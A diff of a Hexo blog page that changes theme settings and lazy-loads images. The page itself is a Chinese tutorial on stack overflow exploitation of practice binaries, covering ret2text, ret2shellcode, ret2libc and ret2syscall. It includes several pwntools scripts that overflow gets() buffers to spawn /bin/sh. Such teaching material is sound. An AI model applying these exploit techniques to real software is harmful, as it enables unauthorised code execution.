@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -270,6 +278,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -284,7 +296,12 @@
                     
 
                     
-                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171334911.png"  alt="img"></p>
+                         <p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171334911.png"
+                        alt="img"
+                 ></p>
 <h2 id="fun-a-b-调用过程"><a href="#fun-a-b-调用过程" class="headerlink" title="fun(a,b)调用过程"></a>fun(a,b)调用过程</h2><p><strong>入栈</strong></p>
 <p>（1）<strong>压入参数</strong> </p>
 <p>根据调用约定，<code>main</code>函数作为调用者，首先需要将<code>func</code>函数的两个参数a,b压入栈中。</p>
@@ -295,12 +312,22 @@
 <p>（3）<strong>func函数运行</strong></p>
 <p><code>func</code>函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：<code>push ebp</code>   <code>mov ebp,esp</code>  <code>sub esp,28h</code></p>
 <p>这个28h就是开辟的存储<code>func</code>函数的相关内存的空间</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171403792.png"  alt="image-20250711171403792"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171403792.png"
+                        alt="image-20250711171403792"
+                 ></p>
 <p><code>mov ebp,esp</code>看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。</p>
 <p>（4）<strong>func函数的局部变量和参数</strong></p>
 <p><code>func</code>函数有自己内部的运作空间，即func_ebp到func_esp</p>
 <p>局部变量在编译之后会被表示为与ebp 不同的距离</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171421699.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171421699.png"
+                        alt="img"
+                 ></p>
 <p>v2被表示为ebp -18h，v3被表示为ebp -10h。</p>
 <p>注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12</p>
 <p>因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面</p>
@@ -314,8 +341,18 @@
 <p>每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的</p>
 <p>目的。</p>
 <p>到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171510506.png"  alt="img"></p>
-<h2 id="Linux操作系统的保护"><a href="#Linux操作系统的保护" class="headerlink" title="Linux操作系统的保护"></a>Linux操作系统的保护</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171532889.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171510506.png"
+                        alt="img"
+                 ></p>
+<h2 id="Linux操作系统的保护"><a href="#Linux操作系统的保护" class="headerlink" title="Linux操作系统的保护"></a>Linux操作系统的保护</h2><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171532889.png"
+                        alt="img"
+                 ></p>
 <p> <code>Arch:amd64-64-little</code>：</p>
 <p>amd64即x86_64(CPU架构)                 </p>
 <p>64即字长为64，返回地址在栈中占 8字节，32位是4字节）</p>
@@ -326,21 +363,41 @@
 <p>如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。</p>
 <p><code>PIE：No PIE（0x8048000）</code></p>
 <h2 id="ret2text-覆盖返回地址"><a href="#ret2text-覆盖返回地址" class="headerlink" title="ret2text(覆盖返回地址)"></a>ret2text(覆盖返回地址)</h2><p>该函数内存在get漏洞</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171548307.png"  alt="image-20250711171548307"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171548307.png"
+                        alt="image-20250711171548307"
+                 ></p>
 <p>该函数泄露了后门函数</p>
 <p>接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数</p>
 <p>target函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。</p>
 <p>找填充字节</p>
 <p>直接从IDA中读出长度</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171603088.png"  alt="image-20250711171603088"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171603088.png"
+                        alt="image-20250711171603088"
+                 ></p>
 <p>s到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4</p>
 <p>那个4是32位的ebp的空间</p>
 <h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./ret2text&quot;)</span><br><span class="line">p.recvuntil(&quot;ret2text\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="ret2shellcode（覆盖返回地址到Shellcode）"><a href="#ret2shellcode（覆盖返回地址到Shellcode）" class="headerlink" title="ret2shellcode（覆盖返回地址到Shellcode）"></a>ret2shellcode（覆盖返回地址到Shellcode）</h2><p>Shellcode是<strong>机器码格式的恶意代码</strong>，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171705724.png"  alt="image-20250711171705724"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171705724.png"
+                        alt="image-20250711171705724"
+                 ></p>
 <p> <code>printf(&quot;%p\n&quot;, s)</code>输出了S的缓冲区的位置</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171725511.png"  alt="image-20250711171725511"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171725511.png"
+                        alt="image-20250711171725511"
+                 ></p>
 <p>没有开启NX保护</p>
 <p>所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。</p>
 <h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">p = process(&quot;./ret2shellcode&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048593&quot;)</span><br><span class="line">p.recvuntil(b&quot;ret2shellcode\n&quot;) # 修改为字节串</span><br><span class="line">target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16) # 修改为字节串</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -386,12 +443,32 @@
 <li><strong>阻止什么？</strong> 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。</li>
 </ul>
 <h3 id="ret2libc1（单个函数的rop来链）"><a href="#ret2libc1（单个函数的rop来链）" class="headerlink" title="ret2libc1（单个函数的rop来链）"></a>ret2libc1（单个函数的rop来链）</h3><p>第一步，先看保护</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170101689.png"  alt="image-20250713170101689"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170137922.png"  alt="image-20250713170137922"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170101689.png"
+                        alt="image-20250713170101689"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170137922.png"
+                        alt="image-20250713170137922"
+                 ></p>
 <p>get溢出</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165720453.png"  alt="image-20250713165720453"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165720453.png"
+                        alt="image-20250713165720453"
+                 ></p>
 <p>system函数存在,但参数不是&#x2F;bin&#x2F;sh</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165931741.png"  alt="image-20250713165931741"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165931741.png"
+                        alt="image-20250713165931741"
+                 ></p>
 <p>system函数存在,并且程序中心存在bin&#x2F;sh字符串</p>
 <p>所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数</p>
 <p>要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈</p>
@@ -414,16 +491,41 @@
 <li><strong>优点</strong>：最简单。</li>
 <li><strong>缺点</strong>：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 <code>system</code> 是否被调用，可能会暂时使用。</li>
 </ul>
-<h3 id="ret2libc2-两个函数的rop链"><a href="#ret2libc2-两个函数的rop链" class="headerlink" title="ret2libc2(两个函数的rop链)"></a>ret2libc2(两个函数的rop链)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170240614.png"  alt="image-20250713170240614"></p>
+<h3 id="ret2libc2-两个函数的rop链"><a href="#ret2libc2-两个函数的rop链" class="headerlink" title="ret2libc2(两个函数的rop链)"></a>ret2libc2(两个函数的rop链)</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170240614.png"
+                        alt="image-20250713170240614"
+                 ></p>
 <p>该题没有bin&#x2F;sh字符串</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171815449.png"  alt="image-20250711171815449"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171815449.png"
+                        alt="image-20250711171815449"
+                 ></p>
 <p>所以我们要自己去通过get构造</p>
 <p>(1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171840435.png"  alt="image-20250711171840435">（)</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171840435.png"
+                        alt="image-20250711171840435"
+                 >（)</p>
 <p>（2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171859788.png"  alt="image-20250711171859788"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171859788.png"
+                        alt="image-20250711171859788"
+                 ></p>
 <p>分析之后得到应该构造如下形式的payload</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171926928.png"  alt="image-20250711171926928"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171926928.png"
+                        alt="image-20250711171926928"
+                 ></p>
 <p>其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数</p>
 <p>get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh”</p>
 <p>Payload的形式是<strong>p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）</strong>。</p>
@@ -437,37 +539,87 @@
 <p><strong>找bss地址</strong></p>
 <p>1.readelf</p>
 <p><code>readelf -S ret2libc2</code></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171951259.png"  alt="image-20250711171951259"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171951259.png"
+                        alt="image-20250711171951259"
+                 ></p>
 <p>2.gdb调试</p>
 <p><code>gdb ./ret2libc2</code>    <code>info files</code></p>
-<p><img   src="D:/Typora/image/a1f45cd6572f00a22b10553057e87fe.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="D:/Typora/image/a1f45cd6572f00a22b10553057e87fe.png"
+                        alt="img"
+                 ></p>
 <p>显示了bss段的始末位置</p>
 <p>3.脚本中直接得到</p>
 <p><code>elf.bss()</code></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172012341.png"  alt="image-20250711172012341"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172012341.png"
+                        alt="image-20250711172012341"
+                 ></p>
 <h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x08048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>gdb调试检查是否成功写入</p>
 <p>c一下运行到下断点位置</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172028504.png"  alt="image-20250711172028504"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172042265.png"  alt="image-20250711172042265"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172028504.png"
+                        alt="image-20250711172028504"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172042265.png"
+                        alt="image-20250711172042265"
+                 ></p>
 <p>这个时候第一个get已经实现，payload已经传入了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172056178.png"  alt="image-20250711172056178"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172056178.png"
+                        alt="image-20250711172056178"
+                 ></p>
 <p>下一步会进入我们传进去的get中</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172132836.png"  alt="image-20250711172132836"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172132836.png"
+                        alt="image-20250711172132836"
+                 ></p>
 <p>get 和system函数都执行结束后</p>
 <p><code>x/s 0x0804a040</code>发现bss内存入了bin&#x2F;sh</p>
 <h3 id="ret2libc2-多个函数的rop链"><a href="#ret2libc2-多个函数的rop链" class="headerlink" title="ret2libc2(多个函数的rop链)"></a>ret2libc2(多个函数的rop链)</h3><p>假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length）</p>
 <p>这是按照两个rop链写出的payload填补形式</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172207173.png"  alt="image-20250711172207173"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172207173.png"
+                        alt="image-20250711172207173"
+                 ></p>
 <p>函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多</p>
 <p>所以这种情况就可以用pop&#x2F;ret进行</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172223075.png"  alt="image-20250711172223075"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172223075.png"
+                        alt="image-20250711172223075"
+                 ></p>
 <p>注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令</p>
 <p>如何<strong>寻找若干个pop指令跟着ret指令</strong></p>
 <p><code>ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</code></p>
 <p>(ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局)</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172236929.png"  alt="image-20250711172236929"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172236929.png"
+                        alt="image-20250711172236929"
+                 ></p>
 <h4 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x8048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">pop1_ret=0x804861b</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(pop1_ret)+p32(bss)</span><br><span class="line">payload+=p32(sys)+p32(pop1_ret)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><code>payload += p32(get) + p32(pop1_ret) + p32(bss)</code>:</p>
@@ -499,13 +651,28 @@
 </ul>
 </li>
 </ol>
-<h3 id="ret2syscall-底层系统调用静态"><a href="#ret2syscall-底层系统调用静态" class="headerlink" title="ret2syscall(底层系统调用静态)"></a>ret2syscall(底层系统调用静态)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png"  alt="image-20250711172249291"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713164900591.png"  alt="image-20250713164900591"></p>
+<h3 id="ret2syscall-底层系统调用静态"><a href="#ret2syscall-底层系统调用静态" class="headerlink" title="ret2syscall(底层系统调用静态)"></a>ret2syscall(底层系统调用静态)</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png"
+                        alt="image-20250711172249291"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713164900591.png"
+                        alt="image-20250713164900591"
+                 ></p>
 <p>开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值</p>
 <p>除此之外没有上面有效的东西了,整个二进制文件中都没有system函数</p>
 <p>所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、</p>
 <p>根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172303242.png"  alt="image-20250711172303242"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172303242.png"
+                        alt="image-20250711172303242"
+                 ></p>
